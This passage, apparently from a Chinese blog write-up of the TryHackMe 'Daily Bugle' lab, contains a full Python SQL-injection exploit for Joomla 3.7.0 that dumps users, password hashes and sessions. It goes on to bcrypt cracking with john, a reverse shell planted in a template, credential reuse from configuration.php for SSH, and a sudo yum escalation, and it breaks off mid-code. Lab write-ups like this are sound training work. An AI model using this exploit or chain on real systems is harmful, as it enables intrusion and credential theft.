class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_token</span>(<span class="hljs-params">resp</span>):<br><span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;name=&quot;([a-f0-9]&#123;32&#125;)&quot; value=&quot;1&quot;&#x27;</span>, resp.text, re.S)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; [!] Cannot find CSRF token&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><span class="hljs-keyword">return</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_options</span>():<br>parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;Jooma Exploit&#x27;</span>)<br>parser.add_argument(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Base URL for Joomla site&#x27;</span>)<br><span class="hljs-keyword">return</span> parser.parse_args()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_sqli</span>(<span class="hljs-params">colname, morequery</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;(SELECT &quot;</span> + colname + <span class="hljs-string">&quot; &quot;</span> + morequery + <span class="hljs-string">&quot;)&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">joomla_370_sqli_extract</span>(<span class="hljs-params">options, sess, token, colname, morequery</span>):<br>sqli = build_sqli(<span class="hljs-string">&quot;LENGTH(&quot;</span>+colname+<span class="hljs-string">&quot;)&quot;</span>, morequery)<br>length = joomla_370_sqli(options, sess, token, sqli)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> length:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>length = <span class="hljs-built_in">int</span>(length)<br>maxbytes = <span class="hljs-number">30</span><br>offset = <span class="hljs-number">0</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">while</span> length &gt; offset:<br>sqli = build_sqli(<span class="hljs-string">&quot;HEX(MID(%s,%d,%d))&quot;</span> % (colname, offset + <span class="hljs-number">1</span>, <span class="hljs-number">16</span>), morequery)<br>value = joomla_370_sqli(options, sess, token, sqli)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> value:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; [!] Failed to retrieve string for query:&quot;</span>, sqli)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>value = binascii.unhexlify(value).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>result += value<br>offset += <span class="hljs-built_in">len</span>(value)<br><span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">joomla_370_sqli</span>(<span class="hljs-params">options, sess, token, sqli</span>):<br>sqli_full = <span class="hljs-string">&quot;UpdateXML(2, concat(0x3a,&quot;</span> + sqli + <span class="hljs-string">&quot;, 0x3a), 1)&quot;</span><br>data = &#123;<br><span class="hljs-string">&#x27;option&#x27;</span>: <span class="hljs-string">&#x27;com_fields&#x27;</span>,<br><span class="hljs-string">&#x27;view&#x27;</span>: <span class="hljs-string">&#x27;fields&#x27;</span>,<br><span class="hljs-string">&#x27;layout&#x27;</span>: <span class="hljs-string">&#x27;modal&#x27;</span>,<br><span class="hljs-string">&#x27;list[fullordering]&#x27;</span>: sqli_full,<br>token: <span class="hljs-string">&#x27;1&#x27;</span>,<br>&#125;<br>resp = sess.get(options.url + <span class="hljs-string">&quot;/index.php?option=com_fields&amp;view=fields&amp;layout=modal&quot;</span>, params=data, allow_redirects=<span class="hljs-literal">False</span>)<br><span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;XPATH syntax error:\s*&amp;#039;([^$\n]+)\s*&amp;#039;\s*&lt;/bl&#x27;</span>, resp.text, re.S)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br><span class="hljs-keyword">match</span> = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>).strip()<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">match</span>[-<span class="hljs-number">1</span>] != <span class="hljs-string">&#x27;:&#x27;</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><span class="hljs-keyword">return</span> <span class="hljs-keyword">match</span>[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_joomla_tables</span>(<span class="hljs-params">options, sess, token</span>):<br>tables = <span class="hljs-built_in">list</span>()<br>first = <span class="hljs-literal">False</span><br>offset = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>result = joomla_370_sqli_extract(options, sess, token, <span class="hljs-string">&quot;TABLE_NAME&quot;</span>, <span class="hljs-string">&quot;FROM information_schema.tables WHERE TABLE_NAME LIKE 0x257573657273 LIMIT &quot;</span> + <span class="hljs-built_in">str</span>(offset) + <span class="hljs-string">&quot;,1&quot;</span> )<br><span class="hljs-keyword">if</span> result <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br><span class="hljs-keyword">if</span> first:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] Failed to retrieve first table name!&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">break</span><br>tables.append(result)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  -  Found table:&quot;</span>, result)<br>first = <span class="hljs-literal">False</span><br>offset += <span class="hljs-number">1</span><br><span class="hljs-keyword">return</span> tables<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_joomla_users</span>(<span class="hljs-params">options, sess, token, table_name</span>):<br>users = <span class="hljs-built_in">list</span>()<br>offset = <span class="hljs-number">0</span><br>first = <span class="hljs-literal">False</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  -  Extracting users from&quot;</span>, table_name)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>result = joomla_370_sqli_extract(options, sess, token, <span class="hljs-string">&quot;CONCAT(id,0x7c,name,0x7c,username,0x7c,email,0x7c,password,0x7c,otpKey,0x7c,otep)&quot;</span>, <span class="hljs-string">&quot;FROM %s ORDER BY registerDate ASC LIMIT %d,1&quot;</span> % (table_name, offset) )<br><span class="hljs-keyword">if</span> result <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br><span class="hljs-keyword">if</span> first:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] Failed to retrieve user from table!&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">break</span><br>result = result.split(<span class="hljs-string">&#x27;|&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; [$] Found user&quot;</span>,result)<br>first = <span class="hljs-literal">False</span><br>offset += <span class="hljs-number">1</span><br>users.append(result)<br><span class="hljs-keyword">return</span> users<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_joomla_sessions</span>(<span class="hljs-params">options, sess, token, table_name</span>):<br>sessions = <span class="hljs-built_in">list</span>()<br>offset = <span class="hljs-number">0</span><br>first = <span class="hljs-literal">False</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  -  Extracting sessions from&quot;</span>, table_name)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>result = joomla_370_sqli_extract(options, sess, token, <span class="hljs-string">&quot;CONCAT(userid,0x7c,session_id,0x7c,username)&quot;</span>, <span class="hljs-string">&quot;FROM %s WHERE guest = 0 LIMIT %d,1&quot;</span> % (table_name, offset) )<br><span class="hljs-keyword">if</span> result <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br><span class="hljs-keyword">if</span> first:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] Failed to retrieve session from table!&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">break</span><br>result = result.split(<span class="hljs-string">&#x27;|&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; [$] Found session&quot;</span>, result)<br>first = <span class="hljs-literal">False</span><br>offset += <span class="hljs-number">1</span><br>sessions.append(result)<br><span class="hljs-keyword">return</span> sessions<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_joomla_again</span>(<span class="hljs-params">options</span>):<br>sess = requests.Session()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; [-] Fetching CSRF token&quot;</span>)<br>resp = sess.get(options.url + <span class="hljs-string">&quot;/index.php/component/users/?view=login&quot;</span>)<br>token = extract_token(resp)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> token:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># Verify that we can perform SQLi</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; [-] Testing SQLi&quot;</span>)<br>result = joomla_370_sqli(options, sess, token, <span class="hljs-string">&quot;128+127&quot;</span>)<br><span class="hljs-keyword">if</span> result != <span class="hljs-string">&quot;255&quot;</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; [!] Could not find SQLi output!&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>tables = extract_joomla_tables(options, sess, token)<br><br><span class="hljs-keyword">for</span> table_name <span class="hljs-keyword">in</span> tables:<br>table_prefix = table_name[:-<span class="hljs-number">5</span>]<br>extract_joomla_users(options, sess, token, table_name)<br>extract_joomla_sessions(options, sess, token, table_prefix + <span class="hljs-string">&#x27;session&#x27;</span>)<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_logo</span>():<br>clear = <span class="hljs-string">&quot;\x1b[0m&quot;</span><br>colors = [<span class="hljs-number">31</span>, <span class="hljs-number">32</span>, <span class="hljs-number">33</span>, <span class="hljs-number">34</span>, <span class="hljs-number">35</span>, <span class="hljs-number">36</span>]<br><br>logo = <span class="hljs-string">&quot;&quot;&quot;                                                                                                                    </span><br><span class="hljs-string">    .---.    .-&#x27;&#x27;&#x27;-.        .-&#x27;&#x27;&#x27;-.                                                           </span><br><span class="hljs-string">    |   |   &#x27;   _    \     &#x27;   _    \                            .---.                        </span><br><span class="hljs-string">    &#x27;---&#x27; /   /` &#x27;.   \  /   /` &#x27;.   \  __  __   ___   /|        |   |            .           </span><br><span class="hljs-string">    .---..   |     \  &#x27; .   |     \  &#x27; |  |/  `.&#x27;   `. ||        |   |          .&#x27;|           </span><br><span class="hljs-string">    |   ||   &#x27;      |  &#x27;|   &#x27;      |  &#x27;|   .-.  .-.   &#x27;||        |   |         &lt;  |           </span><br><span class="hljs-string">    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           </span><br><span class="hljs-string">    |   | `.   ` ..&#x27; /   `.   ` ..&#x27; /  |  |  |  |  |  |||/&#x27;__ &#x27;. |   | .:--.&#x27;.  | | .&#x27;&#x27;&#x27;-.    </span><br><span class="hljs-string">    |   |    &#x27;-...-&#x27;`       &#x27;-...-&#x27;`   |  |  |  |  |  ||:/`  &#x27;. &#x27;|   |/ |   \ | | |/.&#x27;&#x27;&#x27;. \   </span><br><span class="hljs-string">    |   |                              |  |  |  |  |  |||     | ||   |`&quot; __ | | |  /    | |   </span><br><span class="hljs-string">    |   |                              |__|  |__|  |__|||\    / &#x27;|   | .&#x27;.&#x27;&#x27;| | | |     | |   </span><br><span class="hljs-string"> __.&#x27;   &#x27;                                              |/\&#x27;..&#x27; / &#x27;---&#x27;/ /   | |_| |     | |   </span><br><span class="hljs-string">|      &#x27;                                               &#x27;  `&#x27;-&#x27;`       \ \._,\ &#x27;/| &#x27;.    | &#x27;.  </span><br><span class="hljs-string">|____.&#x27;                                                                `--&#x27;  `&quot; &#x27;---&#x27;   &#x27;---&#x27; </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> logo.split(<span class="hljs-string">&quot;\n&quot;</span>):<br>sys.stdout.write(<span class="hljs-string">&quot;\x1b[1;%dm%s%s\n&quot;</span> % (random.choice(colors), line, clear))<br><span class="hljs-comment">#time.sleep(0.05)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">base_url</span>):<br>options = parse_options()<br>options.url = options.url.rstrip(<span class="hljs-string">&#x27;/&#x27;</span>)<br>print_logo()<br>pwn_joomla_again(options)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>sys.exit(main(<span class="hljs-string">&quot;http://192.168.10.100:8080/joomla&quot;</span>))<br></code></pre></td></tr></table></figure><p>跑一下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">python3 joomblah.py http://<span class="hljs-number">10.10</span><span class="hljs-number">.223</span><span class="hljs-number">.240</span><br>[-] Fetching CSRF token<br> [-] Testing SQLi<br>  -  Found table: fb9j5_users<br>  -  Extracting users <span class="hljs-keyword">from</span> fb9j5_users<br> [$] Found user [<span class="hljs-string">&#x27;811&#x27;</span>, <span class="hljs-string">&#x27;Super User&#x27;</span>, <span class="hljs-string">&#x27;jonah&#x27;</span>, <span class="hljs-string">&#x27;jonah@tryhackme.com&#x27;</span>, <span class="hljs-string">&#x27;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>]<br>  -  Extracting sessions <span class="hljs-keyword">from</span> fb9j5_session<br></code></pre></td></tr></table></figure><blockquote><p>What is Jonah’s cracked password?</p></blockquote><p>gpt一下，是<code>bcrypt</code>类型的密码，john爆破一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt<br>spiderman123     (?)<br></code></pre></td></tr></table></figure><p>登录后台后有个模板管理，看看能不能弹个shell</p><p><img src="/img/blogimg/Untitled7.png"></p><p>在默认模板里面把index.php改成反弹shell的脚本，然后再访问<code>http://10.10.223.240/index.php</code></p><p><img src="/img/blogimg/Untitled8.png"></p><blockquote><p>What is the user flag?</p></blockquote><p>apache的权限，要提权才能拿<code>jjameson</code>的flag，计划任务、suid、sudo -l、内核提权都不行，看一下网站目录下面有没有配置文件之类的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">sh-4.2$ <span class="hljs-built_in">cd</span> /var/www/html<br>sh-4.2$ <span class="hljs-built_in">ls</span><br>LICENSE.txt<br>README.txt<br>administrator<br>bin<br>cache<br>cli<br>components<br>configuration.php<br>htaccess.txt<br>images<br>includes<br>index.php<br>language<br>layouts<br>libraries<br>media<br>modules<br>plugins<br>robots.txt<br>templates<br>tmp<br>web.config.txt<br></code></pre></td></tr></table></figure><p>configuration.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JConfig</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$offline</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$offline_message</span> = <span class="hljs-string">&#x27;This site is down for maintenance.&lt;br /&gt;Please check back again soon.&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$display_offline_message</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$offline_image</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$sitename</span> = <span class="hljs-string">&#x27;The Daily Bugle&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$editor</span> = <span class="hljs-string">&#x27;tinymce&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$captcha</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$list_limit</span> = <span class="hljs-string">&#x27;20&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$access</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$debug</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$debug_lang</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$dbtype</span> = <span class="hljs-string">&#x27;mysqli&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$host</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;nv5uz9r3ZEDzVjNu&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span> = <span class="hljs-string">&#x27;joomla&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$dbprefix</span> = <span class="hljs-string">&#x27;fb9j5_&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$live_site</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$secret</span> = <span class="hljs-string">&#x27;UAMBRWzHO3oFPmVC&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$gzip</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$error_reporting</span> = <span class="hljs-string">&#x27;default&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$helpurl</span> = <span class="hljs-string">&#x27;https://help.joomla.org/proxy/index.php?keyref=Help&#123;major&#125;&#123;minor&#125;:&#123;keyref&#125;&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$ftp_host</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$ftp_port</span> = <span class="hljs-string">&#x27;21&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$ftp_user</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$ftp_pass</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$ftp_root</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$ftp_enable</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$offset</span> = <span class="hljs-string">&#x27;UTC&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mailonline</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mailer</span> = <span class="hljs-string">&#x27;mail&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mailfrom</span> = <span class="hljs-string">&#x27;jonah@tryhackme.com&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$fromname</span> = <span class="hljs-string">&#x27;The Daily Bugle&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$sendmail</span> = <span class="hljs-string">&#x27;/usr/sbin/sendmail&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$smtpauth</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$smtpuser</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$smtppass</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$smtphost</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$smtpsecure</span> = <span class="hljs-string">&#x27;none&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$smtpport</span> = <span class="hljs-string">&#x27;25&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$caching</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cache_handler</span> = <span class="hljs-string">&#x27;file&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cachetime</span> = <span class="hljs-string">&#x27;15&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cache_platformprefix</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$MetaDesc</span> = <span class="hljs-string">&#x27;New York City tabloid newspaper&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$MetaKeys</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$MetaTitle</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$MetaAuthor</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$MetaVersion</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$robots</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$sef</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$sef_rewrite</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$sef_suffix</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$unicodeslugs</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$feed_limit</span> = <span class="hljs-string">&#x27;10&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$feed_email</span> = <span class="hljs-string">&#x27;none&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$log_path</span> = <span class="hljs-string">&#x27;/var/www/html/administrator/logs&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$tmp_path</span> = <span class="hljs-string">&#x27;/var/www/html/tmp&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$lifetime</span> = <span class="hljs-string">&#x27;15&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$session_handler</span> = <span class="hljs-string">&#x27;database&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$shared_session</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br></code></pre></td></tr></table></figure><p><code>nv5uz9r3ZEDzVjNu</code>应该是mysql的密码，但是和ssh是一样的，直接ssh登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[jjameson@dailybugle ~]$ <span class="hljs-built_in">cat</span> user.txt <br>27a260fe3cba712cfdedb1c86d80442e<br></code></pre></td></tr></table></figure><blockquote><p>What is the root flag?</p></blockquote><p>sudo -l</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[jjameson@dailybugle ~]$ sudo -l<br>匹配 %2<span class="hljs-variable">$s</span> 上 %1<span class="hljs-variable">$s</span> 的默认条目：<br>    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=<span class="hljs-string">&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR</span><br><span class="hljs-string">    LS_COLORS&quot;</span>, env_keep+=<span class="hljs-string">&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;</span>, env_keep+=<span class="hljs-string">&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT</span><br><span class="hljs-string">    LC_MESSAGES&quot;</span>, env_keep+=<span class="hljs-string">&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;</span>, env_keep+=<span class="hljs-string">&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET</span><br><span class="hljs-string">    XAUTHORITY&quot;</span>, secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin<br><br>用户 jjameson 可以在 dailybugle 上运行以下命令：<br>    (ALL) NOPASSWD: /usr/bin/yum<br></code></pre></td></tr></table></figure><p>yum提权</p><p><img src="/img/blogimg/Untitled9.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 